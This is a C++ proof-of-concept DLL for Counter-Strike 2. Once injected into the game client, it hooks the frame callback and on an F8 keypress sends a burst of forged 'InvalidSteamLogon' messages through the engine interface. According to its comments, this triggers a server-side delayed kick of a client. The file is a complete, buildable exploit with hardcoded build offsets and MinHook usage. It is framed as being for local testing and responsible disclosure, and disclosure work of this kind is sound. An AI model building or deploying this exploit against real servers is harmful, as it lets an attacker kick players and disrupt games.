// PoC: send "InvalidSteamLogon" through Source2EngineToClient001::CmdKeyValues.
// For local dedicated server testing and responsible disclosure.
//
// Connect to a local server, inject, then press F8 to start a burst.
// Dispatch runs on the game thread; the net channel / KV path isn't thread-safe.
//
// Build from a VS x64 developer prompt with MinHook.h and MinHook.x64.lib available:
//   cl /LD /EHsc /O2 invalidsteamlogon_poc.cpp /link /OUT:invalidsteamlogon_poc.dll minhook.x64.lib
//
// Expected server log (server.dll:0x1801ec765):
//   "Invalid Steam Logon Delayed: Kicking client [U:1:%d] %s"

#include <windows.h>
#include <cstdint>
#include <cstdio>

#include "MinHook.h"

// Build-specific client.dll RVAs. KV entries point to IAT slots.
static constexpr uintptr_t kEnginePtrRva        = 0x39F7F8;  // g_pEngine (Source2EngineToClient001*)
static constexpr uintptr_t kKVNewRva            = 0x19586E8; // KeyValues::operator new
static constexpr uintptr_t kKVCtorRva           = 0x1958750; // KeyValues::KeyValues
static constexpr uintptr_t kKVSetIntRva         = 0x1957818; // KeyValues::SetInt
static constexpr uintptr_t kKVDtorRva           = 0x1958748; // KeyValues::~KeyValues
static constexpr uintptr_t kDispatchOffset      = 0x3B8;     // Byte offset in the engine vtable
static constexpr uintptr_t kFrameStageNotifyRva = 0xB10FA0;  // CSource2Client::FrameStageNotify

using KVNewFn            = void* (__fastcall*)(size_t);
using KVCtorFn           = void* (__fastcall*)(void*, const char*, void*, bool);
using KVSetIntFn         = void  (__fastcall*)(void*, const char*, int);
using KVDtorFn           = void  (__fastcall*)(void*);
using DispatchFn         = void  (__fastcall*)(void*, void*);
using FrameStageNotifyFn = void  (__fastcall*)(void*, int);
using CreateInterfaceFn  = void* (*)(const char*, int*);

static HMODULE g_client = nullptr;

static void* Iat(uintptr_t rva) {
    return *(void**)((uintptr_t)g_client + rva);
}

static void* GetEngineInterface() {
    HMODULE engineModule = GetModuleHandleA("engine2.dll");
    if (!engineModule) {
        return nullptr;
    }

    auto createInterface = (CreateInterfaceFn)GetProcAddress(engineModule, "CreateInterface");
    if (!createInterface) {
        return nullptr;
    }

    return createInterface("Source2EngineToClient001", nullptr);
}

static void SendInvalidSteamLogon(int reason) {
    char message[256];
    void* engine = GetEngineInterface();
    if (!engine) {
        printf("[poc] no Source2EngineToClient001 interface\n");
        return;
    }

    auto kvNew    = (KVNewFn)Iat(kKVNewRva);
    auto kvCtor   = (KVCtorFn)Iat(kKVCtorRva);
    auto kvSetInt = (KVSetIntFn)Iat(kKVSetIntRva);
    auto kvDtor   = (KVDtorFn)Iat(kKVDtorRva);

    // KV layout and construction match CrosshairCode at client.dll:0x180821EB0.
    void* kv = kvNew(0x1Cu);
    if (kv) {
        kvCtor(kv, "InvalidSteamLogon", nullptr, false);
    }
    kvSetInt(kv, "reason", reason); // The server treats 0 as reason 9.

    void* vtable = *(void**)engine;
    DispatchFn dispatch = *(DispatchFn*)((char*)vtable + kDispatchOffset);
    sprintf_s(message, sizeof(message),
              "[poc] engine=%p vt=%p fn=%p kv=%p (reason=%d)\n",
              engine, vtable, dispatch, kv, reason);
    printf("%s", message);

    dispatch(engine, kv);
    kvDtor(kv);
}

// The server stores the delayed-kick reason only when pawn+0x2D8 == 0.
// The other branch sets a flag consumed by the engine's auth path.
// A burst retries across callbacks to catch the branch that stores the reason.
static FrameStageNotifyFn g_originalFrameStageNotify = nullptr;
static long g_sendCount = 0;
static long g_remainingSends = 0;

static void __fastcall HookedFrameStageNotify(void* instance, int stage) {
    g_originalFrameStageNotify(instance, stage);

    static bool wasDown = false;
    bool down = (GetAsyncKeyState(VK_F8) & 0x8000) != 0;
    if (down && !wasDown) {
        g_remainingSends = 180; // Each F8 press starts or restarts the burst.
        printf("[poc] F8 -> burst armed (180 frames)\n");
    }
    wasDown = down;

    if (g_remainingSends > 0) {
        long sendCount = InterlockedIncrement(&g_sendCount);
        if (sendCount % 30 == 1) {
            printf("[poc] burst send #%ld ...\n", sendCount);
        }
        SendInvalidSteamLogon(13);
        InterlockedDecrement(&g_remainingSends);
    }
}

static DWORD WINAPI Main(void*) {
    g_client = GetModuleHandleA("client.dll");
    if (!g_client) {
        return 0;
    }

    if (AllocConsole()) {
        FILE* consoleFile = nullptr;
        freopen_s(&consoleFile, "CONOUT$", "w", stdout);
        freopen_s(&consoleFile, "CONOUT$", "w", stderr);
        SetConsoleTitleA("invalidsteamlogon_poc");
    }
    printf("[poc] loaded into cs2.exe, client=%p\n", g_client);

    void* target = (void*)((uintptr_t)g_client + kFrameStageNotifyRva);
    if (MH_Initialize() != MH_OK) {
        return 0;
    }
    if (MH_CreateHook(target, &HookedFrameStageNotify, (void**)&g_originalFrameStageNotify) == MH_OK) {
        MH_EnableHook(target);
        printf("[poc] FrameStageNotify hooked @ %p\n", target);
    }
    return 0;
}

static DWORD Shutdown(void*) {
    Sleep(5000);
    MH_DisableHook(MH_ALL_HOOKS);
    MH_Uninitialize();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE module, DWORD reason, void*) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(module);
        CreateThread(nullptr, 0, Main, nullptr, 0, nullptr);
    } else if (reason == DLL_PROCESS_DETACH) {
        CreateThread(nullptr, 0, Shutdown, nullptr, 0, nullptr);
    }
    return TRUE;
}
